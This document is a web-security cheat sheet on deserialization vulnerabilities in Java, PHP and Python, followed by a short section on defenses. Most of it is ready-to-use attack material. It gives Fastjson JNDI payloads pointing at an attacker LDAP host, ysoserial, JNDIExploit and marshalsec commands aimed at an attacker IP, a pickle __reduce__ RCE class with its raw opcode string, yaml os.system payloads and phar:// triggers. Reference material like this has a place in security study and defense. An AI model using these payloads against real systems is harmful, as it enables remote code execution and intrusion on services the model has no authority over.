# Web Security - Deserialization Vulnerabilities

> Source: WooYun Vulnerability Database | Split from web-injection.md

## V. Deserialization Vulnerabilities

### 5.1 Vulnerability Essence

```
Serialized data (untrusted) -> Deserialization function -> Object reconstruction triggers magic methods/callbacks -> Malicious logic executed
```

**Core Formula**: Deserialization RCE = Controllable serialized input + Dangerous class in classpath/scope + Reachable gadget chain

### 5.2 Java Deserialization

**Detection Identifiers**

```
Binary stream: AC ED 00 05 (hex header)
Base64:        rO0AB (encoded header)
Common locations: Cookie, ViewState, JMX, RMI, T3 protocol, HTTP Body
```

**Gadget Chain Quick Reference**

| Gadget Chain | Dependency | Trigger Method | Tool |
|---|---|---|---|
| Commons-Collections | commons-collections 3.x/4.x | InvokerTransformer | ysoserial |
| Spring | spring-core + spring-beans | MethodInvokeTypeProvider | ysoserial |
| Fastjson | fastjson < 1.2.68 | `@type` autoType | Manual/dedicated tool |
| Jackson | jackson-databind | Polymorphic deserialization | ysoserial |
| JNDI injection | JDK < 8u191 | LDAP/RMI remote class loading | JNDIExploit/marshalsec |

**Fastjson Classic Payload**

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

// 1.2.47 cache bypass
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/","autoCommit":true}}
```

**Toolchain**

```bash
# Generate payload with ysoserial
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64

# JNDI injection server
java -jar JNDIExploit.jar -i attacker_ip

# Start malicious LDAP/RMI with marshalsec
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit"
```

### 5.3 PHP Deserialization

**Detection Identifiers**

```
Format: O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:25;}
Key functions: unserialize(), phar:// protocol trigger
```

**Magic Method Exploitation Chains**

| Method | Trigger Timing | Exploitation |
|--------|----------------|--------------|
| `__wakeup()` | Called during unserialize() | Property overwrite -> dangerous operation |
| `__destruct()` | When object is destroyed | File deletion/write/command execution |
| `__toString()` | When object is used as a string | Concatenated into dangerous functions |
| `__call()` | When a non-existent method is called | Stepping stone for chained calls |

**POP Chain Construction Strategy**

```
1. Find entry point: __wakeup()/__destruct() calls a method on $this->xxx property
2. Pivot: Link to other classes via __toString()/__call()/__get()
3. Sink: Reach dangerous functions like system()/eval()/file_put_contents()
4. Construct: Control property values to complete the chain
```

**Phar Deserialization (No unserialize() call needed)**

```php
// File operation functions trigger phar:// deserialization
file_exists('phar://upload/evil.phar');
is_dir('phar://upload/evil.jpg');      // Disguised as image extension
```

### 5.4 Python Deserialization

**Dangerous Functions**

```python
import pickle, yaml, marshal

# pickle - most common
pickle.loads(data)      # Deserialize
pickle.load(file)       # Deserialize from file

# yaml - requires Loader
yaml.load(data)         # Unsafe by default (old versions)
yaml.load(data, Loader=yaml.FullLoader)  # Restricted loading

# marshal - bytecode level
marshal.loads(data)     # Load code object
```

**pickle RCE Payload**

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
# Equivalent manual construction:
# pickle.loads(b"cos\nsystem\n(S'whoami'\ntR.")
```

**yaml RCE Payload**

```yaml
!!python/object/apply:os.system ['whoami']
# or
!!python/object/new:subprocess.check_output [['whoami']]
```

### 5.5 Defense Measures

```java
// Java: ObjectInputStream whitelist filtering
ObjectInputStream ois = new ObjectInputStream(input) {
    @Override protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!allowedClasses.contains(desc.getName())) throw new InvalidClassException("Blocked: " + desc.getName());
        return super.resolveClass(desc);
    }
};
```

- **Java**: Upgrade components (Fastjson/Jackson/Commons-Collections), disable autoType, use whitelist deserialization filters
- **PHP**: Avoid unserialize() on user input, use json_decode instead, disable phar:// protocol
- **Python**: Use `yaml.safe_load()` instead of `yaml.load()`, prohibit pickle on untrusted data, use JSON
- **General**: Avoid native serialization formats for data transport, use JSON uniformly; apply signature/HMAC verification on deserialization entry points

---
